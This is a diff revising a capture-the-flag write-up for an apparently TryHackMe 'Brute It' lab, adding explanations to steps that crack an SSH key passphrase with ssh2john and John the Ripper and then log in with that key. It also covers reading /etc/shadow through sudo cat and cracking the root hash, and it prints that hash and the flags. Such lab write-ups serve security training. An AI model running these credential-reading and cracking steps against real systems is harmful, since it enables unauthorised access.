@@ -190,28 +190,28 @@ Right click on page then click save as to download the private key
 
 ```
 To convert the private key to a format that john the ripper can crack use the following command
- ssh2john id_rsa _rsa > id_rsa.hash               
+ssh2john id_rsa _rsa > id_rsa.hash               
 
 To crack the hash run the following command
 
- john --wordlist=rockyou.txt id_rsa.hash                  
+john --wordlist=rockyou.txt id_rsa.hash                  
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
 Cost 2 (iteration count) is 1 for all loaded hashes
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
+
 rockinroll       (id_rsa)     
+
 1g 0:00:00:00 DONE (2024-01-28 19:10) 1.204g/s 87479p/s 87479c/s 87479C/s rubicon..rock14
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 
-john --show id_rsa.hash 
-id_rsa:rockinroll
-
-1 password hash cracked, 0 left
+```
 
 Change the permissions of the private key with the following command
+```
 chmod 600 id_rsa
                                       
 ```
@@ -220,7 +220,7 @@ SSH
 
 Login to the target machine
 ```
-└─# ssh -i id_rsa john@10.10.58.60
+ssh -i id_rsa john@10.10.58.60
 The authenticity of host '10.10.58.60 (10.10.58.60)' can't be established.
 ED25519 key fingerprint is SHA256:kuN3XXc+oPQAtiO0Gaw6lCV2oGx+hdAnqsj/7yfrGnM.
 This key is not known by any other names.
@@ -254,6 +254,8 @@ THM{a_password_is_not_a_barrier}
 ```
 
 Privilege Escalation
+
+This command shows what sudo privileges john has
 ```
 john@bruteit:~$ sudo -l
 Matching Defaults entries for john on bruteit:
@@ -265,6 +267,8 @@ User john may run the following commands on bruteit:
 ```
 
 ```
+Searching gtfobins I find the following commands that allow me to set the root.txt flag (which is usually in the root directory) to a variable and then use cat to read the file
+
 https://gtfobins.github.io/gtfobins/cat/#sudo
 ```
 
@@ -276,18 +280,21 @@ THM{pr1v1l3g3_3sc4l4t10n}
 
 
 
-Login as root user
+**Login as root user**
+With sudo privileges I can read the /etc/shadow file which is inaccesible to regular users
 ```
 john@bruteit:~$ sudo /bin/cat /etc/passwd | head -n 1
 root:x:0:0:root:/root:/bin/bash
 john@bruteit:~$ sudo /bin/cat /etc/shadow | head -n 1
 root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
 ```
+Saving the files into two different text files and then running the following commands allows me to crack the weak password of the root user
+
 
 ```
-└─# unshadow passwd.txt shadow.txt > unshadowed.txt
+unshadow passwd.txt shadow.txt > unshadowed.txt
 
-└─# john --wordlist=rockyou.txt unshadowed.txt               
+john --wordlist=rockyou.txt unshadowed.txt               
 Using default input encoding: UTF-8
 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
